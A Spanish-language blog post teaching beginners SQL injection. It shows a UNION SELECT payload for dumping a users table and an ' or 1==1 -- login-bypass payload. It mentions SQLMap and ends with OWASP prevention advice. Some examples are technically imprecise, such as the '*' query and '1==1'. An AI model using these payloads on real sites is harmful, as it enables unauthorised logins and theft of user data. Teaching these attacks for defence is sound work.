---
layout: post
category: red
tags: SQL SQLi Penstesting OWASP
author: RedDev
SQL Injection For Dummies: Bypasseando el Login
---

### ¿Qué es SQL Injection?
SQL Injection es el nombre que se le da a las diversas técnicas utilizadas para dumpear o aprovechar vulnerabilidades relacionadas con bases de datos sql, ya sea por una mala gestión de ciertos carácteres especiales o por una mala consulta a la base de datos. 
Podemos considerar estas técnicas como las madres de otras técnicas como NoSQLi.

### ¿Cómo puedo realizar estas técnicas?

Primero debemos comprender como funcionan las consultas que se realizan desde una app web hacia su base de datos.

De lado del cliente observaremos un formulario que tendrá uno o más inputs. Pero en el backend os encontraremos un programa que recoge lo introducido en el input y lo inserta en una consulta SQL.Por Ejemplo:

<form >
  <div><input type="text" name="q" id="lola" title="At least 3 characters" required></div>
<input type="submit">
</form>

```html
<form >
  <div><input type="text" name="q" id="lola" title="At least 3 characters" required></div>
<input type="submit">
</form>
```
Aquí tenemos un formulario que tiene id lola, por lo que imaginemos que es un buscador de usuarios por ejemplo. 
En el backend habría una query hacía la base de datos de este tipo:
```SQL
SELECT (lola) FROM USERS;
```
Si nosotros insertaramos '*' por ejemplo, la consulta quedaría de esta forma:

```SQL
SELECT * FROM USERS;
```
Es decir nos dumpearia la tabla USERS, pero hasta aquí no hay nada interesante, ya que el formulario nos devuelve información de los usuarios directamente.


### Pongamonos el BlackHat
Ahora imaginemos que lo que nos devuelve es información de un coche en una base de datos, entoneces nuestra query quedaría de esta forma:
```SQL
SELECT * FROM CARS WHERE NOMBRE LIKE '(lola)';
```
Ahora lo que nos interesa es sacar información de los usuarios, aunque estamos haciendo consultas a admin, por lo que utilizaremos carácteres especiales como '--'.
Con esto podríamos injectar el siguiente "payload":
lola -> [' UNION SELECT * FROM USERS --]
```SQL
SELECT * FROM CARS WHERE NOMBRE LIKE ' ' UNION SELECT * FROM USERS -- ';
```
Con el operador UNION, nos unira los resultados de los dos selects, ademas es importante insertando el cierre de comillas, nos saldremos del string y podremos realizar la otra query además los dos guiones en SQL comentan el resto de la línea.
Y de esta forma, desde un input que consulta coches podrémos dumpear la tabla de usuarios. Pero...¿Como podemos usar esto para por ejemplo bypasear un login?


### ByPass al login 

Lo primero que hay que entender es como funciona este tipo de logins:
<form >
  Username
  <input type="text" id="lola">
  Password
  <input type="password" name="pass" id="pass" >
<input type="submit">
</form>
```html
<form >
  <div><input type="text"  id="lola" >
  ><input type="password" name="pass" id="pass"></div>
<input type="submit">
</form>
```

En el backend nos encontraríamos una query de este estilo:
```SQL
SELECT id,Nombre FROM USERS WHERE USERNAME LIKE '(lola)' AND PASSWORD LIKE '(pass)'
```
En este caso nuestro payload tendría este estilo:
lola -> [' or 1==1 -- ]
Por lo que quedaría así nuestra query:
```SQL
SELECT id,Nombre FROM USERS WHERE USERNAME LIKE '' or 1==1 -- ' AND PASSWORD LIKE '(pass)'
```
Esto lo que nos va a generar es una query que su where da siempre positivo, por lo que nos dará la primera cuenta registrada, la cual suele ser la id = 0 o 1 que suele ser el administrados de la web, y nos loguea como el.

![image](https://github.com/reycotallo98/reycotallo98.github.io/assets/93315382/8dca80f1-b73b-44cc-9031-5beca12682aa)

### Eres un Script Kiddle y no te apetece hacerlo a mano?

Pues he aquí la solucion [SQLMap](https://sqlmap.org/), esta herramienta, con los input de la web, automatiza el proceso de SQLInjection pudiendo incluso sacarte directamente una shell con control sobre el servidor que aloja la web.


### ¿Cómo puedo evitar esto en mi web?
 Segun la organización [OWASP](https://owasp.org/www-community/attacks/SQL_Injection), se recomienda:
 - Usar Prepared Statements con querys parametrizadas.
 - Usar constructores con procesos de alamacenamiento adecuados
 - Validacion de los inputs
 
 Para más información -> [Cheatsheet OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 
 

